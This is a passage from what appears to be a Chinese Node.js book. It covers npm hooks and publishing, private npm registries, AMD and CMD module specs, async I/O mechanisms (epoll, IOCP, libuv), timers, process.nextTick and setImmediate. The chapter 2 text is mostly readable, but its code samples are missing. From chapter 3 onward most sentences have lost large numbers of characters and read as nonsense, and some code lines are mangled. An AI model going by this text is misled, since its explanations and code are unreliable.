如果使用过程中几乎都采用镜像源安装，可以执行以下命令指定默认源：

3. NPM 钩子命令另一个需要说明的是 C/C++模块实际上是编译后才能使用的。package.json 中 scripts 字段的提出就是让包在安装或者卸载等过程中提供钩子机制，示例如下：

在以上字段中执行 npm install <package>时，preinstall 指向的脚本将会被加载执行，然后 install 指向的脚本会被执行。在执行 npmuninstall <package>时，uninstall 指向的脚本也许会做一些清理工作等。当在一个具体的包目录下执行 npm test 时，将会运行 test 指向的脚本。一个优秀的包应当包含测试用例，并在 package.json 文件中配置好运行测试的命令，方便用户运行测试用例，以便检验包是否稳定可靠。4.发布包为了将整个 NPM 的流程串联起来，这里将演示如何编写一个包，将其发布到 NPM 仓库中，并通过 NPM 安装回本地。● 编写模块模块的内容我们尽量保持简单，这里还是以 sayHello 作为例子，相关代码如下：

将这段代码保存为 hello.js 即可。● 初始化包描述文件 package.json 文件的内容尽管相对较多，但是实际发布一个包时并不需要一行一行编写。NPM 提供的 npm init 命令会帮助你生成 package.json 文件，具体如下所示：

NPM 通过提问式的交互逐个填入选项，最后生成预览的包描述文件。如果你满意，输入 yes，此时会在目录下得到 package.json 文件。● 注册包仓库账号为了维护包，NPM 必须要使用仓库账号才允许将包发布到仓库中。注册账号的命令是 npmadduser。这也是一个提问式的交互过程，按顺序进行即可：

● 上传包上传包的命令是 npm publish <folder>。在刚刚创建的 package.json 文件所在的目录下，执行 npm publish .开始上传包，相关代码如下：

在这个过程中，NPM 会将目录打包为一个存档文件，然后上传到官方源仓库中。● 安装包为了体验和测试自己上传的包，可以换一个目录执行 npm install hello_test_jackson 安装它：

● 管理包权限通常，一个包只有一个人拥有权限进行发布。如果需要多人进行发布，可以使用 npm owner 命令帮助你管理包的所有者：

使用这个命令，也可以添加包的拥有者，删除一个包的拥有者：

5.分析包在使用 NPM 的过程中，或许你不能确认当前目录下能否通过 require()顺利引入想要的包，这时可以执行 npm ls 分析包。这个命令可以为你分析出当前路径下能够通过模块路径找到的所有包，并生成依赖树，如下：

2.6.4 局域 NPM 在企业的内部应用中使用 NPM 与开源社区中使用有一定的差别。企业的限制在于，一方面需要享受到模块开发带来的低耦合和项目组织上的好处，另一方面却要考虑到模块保密性的问题。所以，通过 NPM 共享和发布存在潜在的风险。为了同时能够享受到 NPM 上众多的包，同时对自己的包进行保密和限制，现有的解决方案就是企业搭建自己的 NPM 仓库。

所幸，NPM 自身是开源的，无论是它的服务器端和客户端。通过源代码搭建自己的仓库并不是什么秘密。局域 NPM 仓库的搭建方法与搭建镜像站（详情可参见附录 D）的方式几乎一样。与镜像仓库不同的地方在于，企业局域 NPM 可以选择不同步官方源仓库中的包。图 2-10 为企业中混合使用官方仓库和局域仓库的示意图。

图 2-10 混合使用官方仓库和局域仓库的示意图对于企业内部而言，私有的可重用模块可以打包到局域 NPM 仓库中，这样可以保持更新的中心化，不至于让各个小项目各自维护相同功能的模块，杜绝通过复制粘贴实现代码共享的行为。2.6.5 NPM 潜在问题

作为为模块和包服务的工具，NPM 十分便捷。它实质上已经是一个包共享平台，所有人都可以贡献模块并将其打包分享到这个平台上，也可以在许可证（大多是 MIT 许可证）的允许下免费使用它们。NPM 提供的这些便捷，将模块链接到一个共享平台上，缩短了贡献者与使用者之间的距离，这十分有利于模块的传播，进而也十分利于 Node 的推广。几乎没有一种语言或平台有 Node 这样出现才 3 年多就拥有成千上万个第三方模块的情景。这个功劳一部分是因为 Node 选择了 JavaScript，这门语言拥有极大的开发人员基数，具有强大的生产力；另一部分则是因为 CommonJS 规范和 NPM，它们使得产品能够更好地组织、传播和使用。潜在的问题在于，在 NPM 平台上，每个人都可以分享包到平台上，鉴于开发人员水平不一，上面的包的质量也良莠不齐。另一个问题则是，Node 代码可以运行在服务器端，需要考虑安全问题。对于包的使用者而言，包质量和安全问题需要作为是否采纳模块的一个判断条件。

尽管 NPM 没有硬性的方式去评判一个包的质量和安全，好在开源社区也有它内在的健康发展机制，那就是口碑效应，其中 NPM 模块首页（https://npmjs.org/）上的依赖榜可以说明模块的质量和可靠性。第二个可以考查质量的地方是GitHub, NPM 中大多的包都是通过 GitHub 托管的，模块项目的观察者数量和分支数量也能从侧面反映这个模块的可靠性和流行度。第三个可以考量包质量的地方在于包中的测试用例和文档的状况，一个没有单元测试的包基本上是无法被信任的，没有文档的包，使用者使用时内心也是不踏实的。在安全问题上，在经过模块质量的考查之后，应该可以去掉一大半候选包。基于使用者大多是 JavaScript 程序员，难点其实存在于第三方 C/C++扩展模块，这类模块建议在企业的安全部门检查之后方可允许使用。事实上，为了解决上述问题，Isaac Z. Schlueter 计划引入 CPAN 社区中的 Kwalitee 风格来让模块进行自然排序。Kwalitee 是一个拟声词，发音与 quality 相同。CPAN 社区对它的原始定义如下：“Kwalitee”is something that looks likequality, sounds like quality, but is not quitequality.

大致意思就是确认一个模块的质量是否优秀并不是那么容易，只能从一些表象来进行考查，但即便考查都通过，也并不能确定它就是高质量的模块。这个方法能够排除大部分不合格的模块，虽然不够精确但是有效。总体而言，符合 Kwalitee 的模块要满足的条件与上述提及的考查点大致相同。

- 具备良好的测试。
- 具备良好的文档（README、API）。
- 具备良好的测试覆盖率。
- 具备良好的编码规范。
- 更多条件。CPAN 社区制定了相当多的规范来考查模块。未来，NPM 社区也会有更多的规范来考查模块。读者可以根据这些条款区分出那些优秀的模块和糟粕的模块。

## 2.7 前后端共用模块

谈论了许多后端模块的具体实现后，现在我们围绕 CommonJS 规范再次回到前端模块上。JavaScript 在 Node 出现之后，比别的编程语言多了一项优势，那就是一些模块可以在前后端实现共用，这是因为很多 API 在各个宿主环境下都提供。但是在实际情况中，前后端的环境是略有差别的。2.7.1 模块的侧重点前后端 JavaScript 分别搁置在 HTTP 的两端，它们扮演的角色并不同。浏览器端的 JavaScript 需要经历从同一个服务器端分发到多个客户端执行，而服务器端 JavaScript 则是相同的代码需要多次执行。前者的瓶颈在于带宽，后者的瓶颈则在于 CPU 和内存等资源。前者需要通过网络加载代码，后者从磁盘中加载，两者的加载速度不在一个数量级上。纵观 Node 的模块引入过程，几乎全都是同步的。尽管与 Node 强调异步的行为有些相反，但它是合理的。但是如果前端模块也采用同步的方式来引入，那将会在用户体验上造成很大的问题。UI 在初始化过程中需要花费很多时间来等待脚本加载完成。鉴于网络的原因，CommonJS 为后端 JavaScript 制定的规范并不完全适合前端的应用场景。经过一段争执之后，AMD 规范最终在前端应用场景中胜出。它的全称是 Asynchronous ModuleDefinition，即是“异步模块定义”，详见https://github.com/amdjs/amdjs-api/wiki/AMD。除此之外，还有玉伯定义的CMD规范。
2.7.2 AMD 规范 AMD 规范是 CommonJS 模块规范的一个延伸，它的模块定义如下：

它的模块 id 和依赖是可选的，与 Node 模块相似的地方在于 factory 的内容就是实际代码的内容。下面的代码定义了一个简单的模块：

不同之处在于 AMD 模块需要用 define 来明确定义一个模块，而在 Node 实现中是隐式包装的，它们的目的是进行作用域隔离，仅在需要的时候被引入，避免掉过去那种通过全局变量或者全局命名空间的方式，以免变量污染和不小心被修改。另一个区别则是内容需要通过返回的方式实现导出。2.7.3 CMD 规范 CMD 规范由国内的玉伯提出，与 AMD 规范的主要区别在于定义模块和依赖引入的部分。AMD 需要在声明模块的时候指定所有的依赖，通过形参传递依赖到模块内容中：

与 AMD 模块规范相比，CMD 模块更接近于 Node 对 CommonJS 规范的定义：

在依赖部分，CMD 支持动态引入，示例如下：

require、exports 和 module 通过形参传递给模块，在需要依赖模块时，随时调用 require()引入即可。

2.7.4 兼容多种模块规范为了让同一个模块可以运行在前后端，在写作过程中需要考虑兼容前端也实现了模块规范的环境。为了保持前后端的一致性，类库开发者需要将类库代码包装在一个闭包内。以下代码演示如何将 hello()方法定义到不同的运行环境中，它能够兼容 Node、AMD、CMD 以及常见的浏览器环境中：

## 2.8 总结

CommonJS 提出的规范均十分简单，但是现实意义却十分强大。Node 通过模块规范，组织了自身的原生模块，弥补 JavaScript 弱结构性的问题，形成了稳定的结构，并向外提供服务。NPM 通过对包规范的支持，有效地组织了第三方模块，这使得项目开发中的依赖问题得到很好的解决，并有效提供了分享和传播的平台，借助第三方开源力量，使得 Node 第三方模块的发展速度前所未有，这对于其他后端 JavaScript 语言实现而言是从未有过的。从一定的角度上讲，CommonJS 规范帮助 Node 形成了它的骨骼。只有茁壮的根，才能培养出茂盛的枝叶，并成长为参天大树。正是这些底层的规范和实践，使得 Node 有序地发展着，摆脱掉过去 JavaScript 纷乱和被误解的局面，进而进化成良性的生态系统。

## 2.9 参考资源

本章参考的资源如下：

- http://www.commonjs.org
- http://npmjs.org/doc/README.html
- http://www.infoq.com/cn/articles/msh-using-npm-manage-node.js-dependence
- http://nodejs.org/docs/latest/api/modules.html
- http://addyosmani.com/writing-modular-js/
- http://seajs.org/docs/
- http://zh.wikipedia.org/zh/JavaScript
- http://zh.wikipedia.org/wiki/ECMAScript
- http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-262.pdf
- http://www.w3.org/TR/html5/
- http://arstechnica.com/web/news/2009/12/commonjs-effort-sets-javascript-on-path-for-world-domination.ars
- http://cnodejs.org/topic/4f16442ccae1f4aa270010d7
- http://wiki.commonjs.org/wiki/Packages/1.0
- http://npmjs.org/doc/developers.html#The-package-json-File

I/O

# 第 3 章 异步 I/O

在 1 中，我们过 I/O。这个实很就生了，它的大是在 Web 2.0 中，它着 AJAX 的一个 A（Asynchronous）了 Web。Node 在之前，最习编程的程序过于前端工程了。前端编程 GUI 编程的一，中了 Ajax 事，这些都是的应用场景。
事实上，就在于作系统的。在系统中，过信量、有了广的应用。外的是，在绝大多数高编程语言中，并不多，了一。这个的要因也人程序不过程序。
PHP 这门语言的最能这个。它对用不仅了，甚至多线程都不。PHP 语言从到脚都是以的的
。它的优分，于程序序编写务它的在小中本不在，是在复杂的网应用中，它好并发。
在他语言中，管可能在的 API，是程序还是习用的编写应用。在多高编程语言中，作为要编程的，Node 是个。
着 I/O 的还有事驱动线程，它们 Node 的，RyanDahl 是于这几个因了 Node。Ryan Dahl 最初一个高性能的 Web 服务，后为一个可以于它高、可网应用的，因为一个 Web 服务已经它的能了。管它不是一个服务，是可以于它多、强大的网应用。
与 Node 的事驱动、I/O 相的一个产品为 Nginx。
Nginx 用 C 编写，性能优。它们的区在于，Nginx 客端管接的强大能，是它的后于的编程语言。Node 是的，可以作为服务端客端的大量并发请，也能作为客端网中的个应用并发请。
Web 的是网，Node 的就它的一样，是网中灵活的一个。

## 3.1 为什么要异步 I/O

关于 I/O 为在 Node 要，这与 Node 网不关系
。Web 应用已经不是服务就能的时了，在网的下，并发已经是编程中的了。到实，可以从用源分这个起。
3.1.1
的之以在 Web 2.0 中起，是因为在中 JavaScript 在线程上，且它还与 UI 用一个线程。这着 JavaScript 在的时候 UI 应是于的。高性能 JavaScript 一书中经过，脚本的时过 100，用就会到页，以为网页应。在 B/S 中，网的网页的实时很大的。网页时要一个网源，过的，JavaScript 要源从服务端后才能继续，这 UI，不应用的为。可以想，这样的用会多。用请，在下源，JavaScriptUI 的都不会于，可以继续应用的为，用一个活的页。
，前端过可以 UI 的，是前端源的也决于后端的应。一个源自于个不的数的，一个源要 M 的时，个源要 N 的时。用的，大下
//时间为 M getData('from_db'); //时间为 N getData('from_remote_api');
是用，一个源的并不会个源，也个源的请并不一个源的。，我们可以享到并发的优势，相关下
getData('from_db', function (result) {
// 时间为 M
});
getData('from_remote_api', function (result) {
// 时间为 N
});
对者的时，前者为 M+N，后者为 max（M, N）。
着应用复杂性的加，情景会 M+ N+ max（M, N, ），与的优会。一，着网应用不，数会分到多服务上，分会是
。分也着 M 与 N 的会线性，这也会大在性能的。为了读者到 MN 多，3-1 了从 CPU 一到网的数问要的开。
3-1I/O
I/O CPU
CPU 一 3  
CPU 14  
内 250  
 41000000  
网 240000000

这就是 I/O 在 Node 中，甚至作为要的因。I/O 的
式 I/O 的。
只有后端能应源，才能前端的好。
3.1.2
用的因，我们从源分的分一下 I/O 的要性。我们机在发过程中组了，分为 I/O。
务场景中有一组不相关的务要，的有以下。
线程次。
多线程并。

创多线程的开小于并，多线程的是的。多线程的在于创
线程线程上下的开大。外，在复杂的务中，多线程编程经、问题，这是多线程的要因。是多线程在多 CPU 上能有 CPU 的用，这个优势是的。
线程序务的编程人序的。它是最的编程，因为它于。是的在于性能，一个的务都会后续。在机源中，I/O 与 CPU 之是可以并的。
是的编程的问题是，I/O 的会后续务，这源不能好用。
作系统会 CPU 的时分余程，以有用源，于这一，有的
服务为了应能，会过动多个工作程为多的用服务。是对于这一组务言，它分发务到多个程上，以高用源，有务的时会。这于加服务，到用多源服务，它并没能问题。
加源是一服务质量的，它不是一的。线程编程会因 I/O 源不到优的使用。多线程编程也因为编程中的、问题开发人。Node 在者之了它的用线程，多线程、问题
用 I/O，线程，以好使用 CPU。
I/O 可以作 Node 的，因为它是个大 I/O 应用在应用上的，它在线程上源分高。为了弥补线程用多 CPU 的，Node 了前端中 Web Workers 的程，程可以过工作程高用 CPUI/
O。这部分内在 9 中。I/O 的是 I/O 的用不后续，有 I/O 的这时分余要的务。图 3-1 为 I/O 的用图。

图 3-1 I/O 的用图

## 3.2 异步 I/O 实现现状

I/O 在 Node 中应用最为广，是它并 Node 的创。BrendanEich18 国学，它的优之并创，它的创之
并不优，以之他自己创的 JavaScript 一样，Node 的优之也并创。下我们作系统对 I/O 实的。
3.2.1I/OI/O
在到 Node 的时，我们时会到、、、事这些语在一起推-，中与起是一事。从实言，都到了我们并 I/O 的目的。是从机内 I/O 言，//实上是事。
作系统内对于 I/O 只有与
。在用 I/O 时，应用程序要 I/O 才，图 3-2。
I/O 的一个是用之后一定要到系统内有作后，用才
。以读上的一为，系统内在、读数、复数到内中之后
，这个用才。
I/OCPUI/O，时，CPU 的能不能到分用。为了高性能，内了 I/O。I/OI/O 的为用之后会立
，图 3-3。

图 3-2 用 I/O 的过程
有文。文 I/O 文
文的

。I/O 文据文文的数据。I/OI/O 的区 I/O 数据的 I/O 数据数据文。

图 3-3 用 I/O 的过程
I/O 之后，CPU 的时可以用他事务，时的性能是的。
I/O 也在一些问题。由于的 I/O 并没有，立的并不是务的
数，仅仅是前用的。为了的数，应用程序要复用 I/O 作认
是否。这复用作是否的技术做
，下我们就要这技术。
技术都并的。I/OCPU，的是要认是否数，它会 CPU，是对 CPU 源的。这我们且技术是的，以小 I/O 的 CPU。
的技术要有以下这些。
. read。它是最始、性能最的一，过复用 I/O 的数的读。在到最数前，CPU 一用在上。图 3-4 为过 read 的图。

图 3-4 过 read 的图
. select。它是在 read 的上的一，过对上的事。图 3-5 为过 select 的图。

图 3-5 过 select 的图
select 有一个的，就是由于它用一个 1024 的数组，以它最多可以时 1024 个。
. poll。select 有，用的数组的，次它能不要的。是多的时候，它的性能还是分下的。图 3-6 为过 poll 实的图，它与 select 相，性能有。

图 3-6 过 poll 实的图
. epoll。是 Linux 下最高的 I/O 事机，在入的时候没有到 I/O 事，会，到事发生它。它是实用了事、
的，不是遍，以不会 CPU，高。图 3-7 为过 epoll 实的图。

图 3-7 过 epoll 实的图
. kqueue。的实与 epoll，不过它仅在 FreeBSD 系统下在。
技术了 I/O 数的，是对于应用程序言，它只能是一，因为应用程序要 I/O，了很多时。，CPU 要用于遍的，要用于事发生。是它不好。
3.2.2I/O
管 epoll 已经用了事 CPU 的用，是 CPU 几是的，对于前线程言用不。，是否有一想的 I/O
我们的的 I/O 应是应用程序发起用，过遍者事，可以接下一个务，只在 I/O 后过信数应用程序可。图 3-8 为想中的 I/O 图。

图 3-8 想中的 I/O 图
的是，在 Linux 下在这样一，它生的一 I/O（AIO）就是过信数的。
不的是，只有 Linux 下有，且它还有 AIO 仅内 I/O 中的 O_DIRECT 读，用系统。
3.2.3I/O
实想要一些，是要 I/O 的目，并事。前我们场景定在了线程的下，多线程的会是一景。过部分线程 I/O 者 I/O 加
技术数，一个线程，过线程之的信 I/O 到的数
，这就实了 I/O
（管它是的），图图 3-9。

图 3-9 I/O
glibc 的 AIO 是的线程 I/O。的是，它在一些以的 bug，不推荐用。libev 的作者 MarcAlexanderLehmann 新实了一个 I/O 的 libeio。libeio 实质上是用线程与 I/OI/O。最初，Node 在\*nix 下用了 libeiolibev 实 I/O 部分，实了 I/O。在 Nodev0.9.3 中，自实了线程 I/O。
一我没有的 I/O 是 Windows 下的 IOCP，它在程上了想的 I/O 用，I/O 之后的，，用。是它的
内部实是线程，不之在于这些线程由系统内接管。

IOCP 的 I/O 与 Node 的用分。在 Windows 下用了 IOCP 实 I/O。
由于 Windows\*nix 的，Node 了 libuv 作为，使有性的都由这一，并上的 Node 与下的自定线程 IOCP 之自立。Node 在编会，性编 unix 目是 win 目下的源到目程序中，图 3-10。

图 3-10 于 libuv 的图要强一的是，这的 I/O 不仅仅只于的读写。*nix 机了一，
、、接几有机源都为了，因这的的情样能于接。
一个要强的在于我们时到 Node 是线程的，这的线程仅仅只是 JavaScript 在线程中了。在 Node 中，是*nix 还是 Windows，内部 I/O 务的有线程。

## 3.3 Node 的异步 I/O

系统对 I/O 的后，我们继续 Node 是实 I/O 的。这我们了 I/O 的实外，还 Node 的。个 I/O 环的有事环、者
请对。
3.3.1
，我们着强一下 Node 自的事，
是它使数分遍。
在程动时，Node 会创一个于 while(true)的环，一次环的过程我们为 Tick。个 Tick 的过程就是是否有事，有，就事相关的数。在关的数，就它们。后入下个环，不有事，就程。程图图 3-11。

图 3-11 Tick 程图
3.3.2
在个 Tick 的过程中，是否有事要这要入的是。
3.3Node 的 I/O57
个事环中有一个者多个者，是否有事要的过程就是这些者问
是否有要的事。
这个过程就的，一一作，是要作些决于收收到的客人的下。做一，就问收的小，接下有没有要做的，没有的，就下了。在这个过程中，收的小就是者，收到的客人就
是关的数。
，经有，它可能有多个收，就事环中有多个者一样。收到下就是一个事，一个者可能有多个事。
用了的机。事可能自用的者加些时产生，这些产生的事都有对应的者。在 Node 中，事要源于网请、I/O，这些事对应的者有 I/O 者、网 I/O 者。者事了分。
事环是一个的/。I/O、网请是事的生产者
，源源不为 Node 不的事，这些事到对应的者，事环从者事并。
在 Windows 下，这个环于 IOCP 创，在\*nix 下于多线程创。
3.3.3
在这一中，我们过解 Windows 下 I/O（用 IOCP 实）的探从 JavaScript 到系统内之都发生了。
对于一的（）数，数由我们自用，下
var forEach = function (list, callback) { for (var i = 0; i < list.length; i++) { callback(list[i], i, list); } };
对于 Node 中的 I/O 用言，数不由开发者用。从我们发用后，到数，中发生了事实上，从 JavaScript 发起用到内 I/O 作的
过过程中，在一中产，它做。
下我们以最的 fs.open()作为，探索 Node 与之是 I/O 用以数是用的
fs.open = function(path, flags, mode, callback) {
// ...
binding.open(pathModule.\_makeLong(path),
stringToFlags(flags),
mode,
callback);
};
fs.open()的作用是定数开一个，从到一个，这是后续有 I/O 作的初始作。从前的中可以到，JavaScrip
t 的过用 C++心下的作。图 3-12 为用图。

图 3-12 用图
从 JavaScript 用 Node 的心，心用 C++内，内过 libuv 系
统用，这是 Node 经的用。这 libuv 作为，有个的实，实质上是用了 uv*fs_open()。在 uv_fs_open()的用过程中，我们创了一个 FSReqWrap 请对。从 JavaScript 入的数前都在这个请对中，中我们最为关的数在这个对的 oncomplete_sym 性上
req_wrap->object*->Set(oncomplete_sym, callback);
对包后，在 Windows 下，用 QueueUserWorkItem()这个 FSReqWrap 对推入
线程中，的下
QueueUserWorkItem(&uv_fs_thread_proc, req, WT_EXECUTEDEFAULT) \ \

QueueUserWorkItem()接 3 个数一个数是要的的用，这用的是 uv*fs_thread_proc，个数是 uv_fs_thread_proc 时要的数个数是的。线程中有可用线程时，我们会用 uv_fs_thread_proc()。uv_fs_thread* proc()会入数的用相应的数。以 uv_fs_open()为，实上用 fs\_\_open()。
至，JavaScript 用立，由 JavaScript 发起的用的一就。JavaScript 线程可以继续前务的后续作。前的 I/O 作在线程中，不管它是否 I/O，都不会到 JavaScript 线程的后续，就到了的目的。
3.3Node 的 I/O59
请对是 I/O 过程中的要中产，有的都在这个对中，包括入线程以 I/O 作后的。
3.3.4
组好请对、入 I/O 线程，实上了 I/O 的一部分，是部分。
线程中的 I/O 作用之后，会的在 req->result 性上，后用 PostQueuedCompletionStatus()IOCP，前对作已经
PostQueuedCompletionStatus((loop)->iocp, 0, 0, &((req)->overlapped))
PostQueuedCompletionStatus()的作用是 IOCP，并线程还线程。过 PostQueuedCompletionStatus()的，可以过 GetQueuedCompletionStatus()。
在这个过程中，我们实还动用了事环的 I/O 者。在次 Tick 的中，它会用 IOCP 相关的 GetQueuedCompletionStatus()线程中是否有的请，在，会请对加入到 I/O 者的中，后做事。
I/O 者数的为就是请对的 result 性作为数，oncomplete_sym 性作为，后用，以到用 JavaScript 中入的数的目的。
至，个 I/O 的程，图 3-13。

图 3-13 个 I/O 的程
事环、者、请对、I/O 线程这者了 NodeI/O 的本要
。
Windows 下要过 IOCP 系统内发 I/O 用从内已的 I/O 作，以事环，以 I/O 的过程。在 Linux 下过 epoll 实这个过程，FreeBSD 下过 kqueue 实，Solaris 下过 Event ports 实。不的是线程在 Windows 下由内（IOCP）接，\*nix 系下由 libuv 自实。
3.3.5
从前实 I/O 的过程中，我们可以 I/O 的几个关线程、事环、者 I/O 线程。这线程与 I/O 线程之起有些的样。由于我们 JavaScript 是线程的，以识很解为它不能分用多 CPU。事实上，在 Node 中，了 JavaScript 是线程外，Node 自实是多线程的，只是 I/O 线程使用的 CPU。一个要的是，了用并外，有的 I/O（I/O 网 I/O）是可以并起的。

## 3.4 非 I/O 的异步 API

管我们在 Node 的时候，多数情下都会到 I/O，是 Node 中实还在一些与 I/O 关的 API，这一部分也关一下，它们分是 setTimeout()、setInterval()、
setImmediate()process.nextTick()。
3.4.1
setTimeout()setInterval()与中的 API 是一的，分用于次多次定时务。它们的实与 I/O，只是不要 I/O 线程的与。用 setTimeout()者
setInterval()创的定时会入到定时者内部的一个树中。次 Tick 时，会从树中定时对，是否过定时时，过，就一个事，它的数立。
图 3-14 到的要是 setTimeout()的为。setInterval()与之相，区在于后者是复性的测。
定时的问题在于，它并的（在内）。管事环分，是一次环用的时多，下次环时，它也已经时很了。过 setTimeout()定一个务在 10 后，是在 9 后，有一个务用了 5 的 CPU 时，次到定时时，时就已经过 4。
3.4I/O 的 API61

图 3-14 setTimeout()的为
3.4.2process.nextTick()
在了解 process.nextTick()之前，很多人也为了立一个务，会这样用 setTimeout()到的
setTimeout(function () { // TODO }, 0);
由于事环自的，定时的不。事实上，用定时要动用树，创定时对作，setTimeout(fn, 0)的为性能。实上，process.nextTick()的作相对为量
，下
process.nextTick = function(callback) { // on the way out, don't bother. // it won't get fired anyway if (process.\_exiting) return;
if (tickDepth >= process.maxTickDepth) maxTickWarn();
var tock = { callback: callback }; if (process.domain) tock.domain = process.domain; nextTickQueue.push(tock); if (nextTickQueue.length) {
process.\_needTickCallback(); } };
次用 process.nextTick()，只会数入中，在下一 Tick 时。定时中用树的作时复杂为 O(lg(n))，nextTick()的时复杂为 O(1)。相之下，process.nextTick()高。
3.4.3setImmediate()
setImmediate()与 process.nextTick()分，都是数。在 Node v0.9.1 之前，setImmediate()还没有实，时候实的能要是过 process.nextTick()，的下
process.nextTick(function () {
console.log('执行'); }); console.log('正常执行');
上的下
正常执行执行
用 setImmediate()实时，相关下
setImmediate(function () {
console.log('执行'); }); console.log('正常执行');
一样
正常执行执行
是者之实是有的。它们在一起时，会是样的优。下
process.nextTick(function () {
console.log('nextTick 执行'); }); setImmediate(function () {
console.log('setImmediate 执行'); }); console.log('正常执行');
下
正常执行 nextTick 执行 setImmediate 执行
从可以到，process.nextTick()中的数的优要高于 setImmediate()。这的因在于事环对者的是有后序的，process.nextTick()于 idle 者，setImmediate()于 check 者。在一个环中，idle 者于 I/O 者，I/O 者于 check 者。
在实上，process.nextTick()的数在一个数组中，setImmediate()的是在中。在为上，process.nextTick()在环中会数组中的数部，setImmediate()在环中中的一个数。下的可以
//加入 nextTick()的回调函数 process.nextTick(function () {
console.log('nextTick 执行 1'); }); process.nextTick(function () {
console.log('nextTick 执行 2');
}); 3
//加入 setImmediate()的回调函数
setImmediate(function () { console.log('setImmediate 执行 1'); // 进入循环 process.nextTick(function () {
console.log('势入');
}); }); setImmediate(function () {
console.log('setImmediate 执行 2'); }); console.log('正常执行');
下
正常执行 nextTick 执行 1 nextTick 执行 2 setImmediate 执行 1 势入 setImmediate 执行 2
从上可以，一个 setImmediate()的数后，并没有立个，是入了下一环，次 process.nextTick()优、setImmediate()次后的序。之以这样，是为了环能，CPU 用过多后续 I/O 用的情。

## 3.5 事件驱动与高性能服务器

前要了的实，在这个过程中，我们也本了事驱动的实质，
过环加事触发的程序。
管本只用了 fs.open()作为 Node 实 I/O。实质上，I/O 不仅仅应用在作中。对于网接的，Node 也应用到了 I/O，网接上到的请都会事 I/O 者。事环会不这些网 I/O 事。JavaScript 有入数，这些事会最到务。用 NodeWeb 服务，是在这样一个上实的，程图图 3-15。

图 3-15 用 NodeWeb 服务的程图
下为几经的服务，这对下它们的优。. 对于的服务，一次只能一个请，并且余请都于。. /为个请动一个程，这样可以多个请，是它不
性，因为系统源只有多。. /为个请动一个线程。管线程程要量，是由于个线程都用一定内，大并发请到时，内会很用，服务
。
线程/请的性程/请的要好，对于大言不。
线程/请的目前还 Apache 用。Node 过事驱动的请，为
一个请创外的对应线程，可以创线程线程的开，时作系统在务时因为线程，上下的很。这使服务能有不请，使在大量接的情下，也不线程上下开的，这是 Node 高性能的一个因。
事驱动的高已经开始为。服务 Nginx，也了多线程的，用了 Node 相的事驱动。今，Nginx 大有 Apache 之势。Node 有与 Nginx 相的性，不之在于 Nginx 用 C 写，性能高，是它仅于做 Web 服务
，用于反服
务，在务为。Node 是一高性能的，可以用它与 Nginx 相的能，也可以务，且与后的网。者相，Node 没有 Nginx 在 Web 服务，场景大，自性能也不。在实目中，我们可以它们自优，以到应用的最优性能。
事实上，Node 的 I/O 并创，是一个的。在之前，也有一些的于事驱动的实，下。
. Ruby 的 Event Machine。
. Perl 的 AnyEvent。
. Python 的 Twisted。

在这些上用事驱动的时，要一定了解这些。这些没能的因是 I/O 的在。本的 I/O 实，是使 I/O 作与 CPU 作分。这些语言上的 I/O 都是的，一事环中在 I/O，余 I/O 立，性能会下，于服务，他请不能立。
因为在这些熟的语言上，不是，管有这些事驱动的实，开发者会习性用 I/O，这想的高性能接。RyanDahl 在他最的时，Lua 一是最他的语言，是由于 I/O 是 I/O，他使这样一个事驱动的实，也不会到大的使用。在 Node 广之后，社区的 Tim CaswellNode 的这想新到了 Lua，目 luavit。
JavaScript 中的作用数在端已有熟的应用，也很好了 Ryan Dahl 实它的想。JavaScript 在服务端，使 Node 没有包，Node 在性能上的使它一下就在社区中起了。

## 3.6 总结

本了 I/O 一些 I/O 的。可以，事环是实的心，它与中的本了一。像的 Rhino，管是就能在服务端的 JavaScript 时，是并不像用事驱动，是像他语言一用 I/O 作为要，这它在性能上发。Node 是了一的高性能 I/O，了 JavaScript 在服务端不前的。

## 3.7 参考资源

本章参考的资源如下：

- http://cnodejs.org/blog/?p=244
- http://cnodejs.org/blog/?p=2426
- http://cnodejs.org/blog/?p=2489
- http://nodejs.org/nodeconf.pdf
- http://blog.dccmx.com/2011/04/select-poll-epoll-in-kernel/
- http://www.ibm.com/developerworks/cn/linux/l-async/
- http://twistedmatrix.com/trac/
- http://luvit.io/
- http://forum.nginx.org/read.php?2,113524,113587#msg-113587

# 第 4 章 异步编程

有 I/O，有编程。
上一了 Node 过事环实，包括与 I/O 多复用实的 I/O 以与 I/O 关的。Node 是个大到应用的，它从内在机到 API 的，不的。的高性能为它了高的，编程也为部分的。
前中过 I/O 在应用不的因，是编程在程中，务并不自语言的线性习。人能应接对事驱动编程，对它熟悉的要是 GUI 开发者，前端工程 GUI 工程。前端工程习以为并能熟 DOM 事中的事。RyanDahl 好事驱动，Java Script 在中也事驱动的过程，这也使前后端的 JavaScript 在上都于一。语言在不的环境，了的 API 有不外，并不人是一门新语言。
V8I/O 在性能上的，前后端 JavaScript 编程一，是 Node 能并起的要因。

## 4.1 函数式编程

在开始编程之前，JavaScript 今的数深的。在 JavaScript 中，数（function）作为一，使用上自由，用它，者作为数，者作为可。数的灵活性是 JavaScript 人的之一，它与的 Lisp 语言源。JavaScript 在生之前，Brendan Eich 了 Scheme 语言（Scheme 作为 Lisp 的生），收了数编程的，数作为一是。
于数编程在年新，前端图书中这部分识，这作补，因为它是 JavaScript 编程的。
4.1.1
在的语言中，数的数只接本的数是对用，也只是本数对用。下的为的数
function foo(x) { return x; }
高数是可以数作为数，是数作为的数，下的
function foo(x) { return function () { return x; }; }
高数可以数作为入的起小，是对于 C/C++语言言，过也可以到相的。对于程序编写，高数的数要灵活多。了的数用外，还了一后续（ContinuationPassingStyle）的接收，一的。后续的程序编写数的务从到了数中
function foo(x, bar) { return bar(x); }
以上的为，对于相的 foo()数，入的 bar 数不，可以到不的。一个经的是数组的 sort()，它是一个实的高数，可以接一个作为数与序
var points = [40, 100, 1, 5, 25, 10]; points.sort(function(a, b) {
return a - b; }); //[ 1, 5, 10, 25, 40, 100]
过动 sort()的数，可以决定不的序，从这可以高数的灵活性。Node 的最本的事可以到，事的是于高数的性的。在自定事实中，过为相事不的数，可以很灵活务。下
var emitter = new events.EventEmitter(); emitter.on('event*foo', function () { // TODO });
本书时到事可以分复杂务的解，它实于高数。高数在 JavaScript 中是，中 ECMAScript5 中的一些数组（forEach()、map()、reduce()、reduceRight()、filter()、every()、some()）分。
4.1.2
数用是创一个用外一个部分数量已经的数的数的用。这相对为，下我们以实
var toString = Object.prototype.toString;
var isString = function (obj) {
return toString.call(obj) == '[object String]'; }; var isFunction = function (obj) {
return toString.call(obj) == '[object Function]'; };
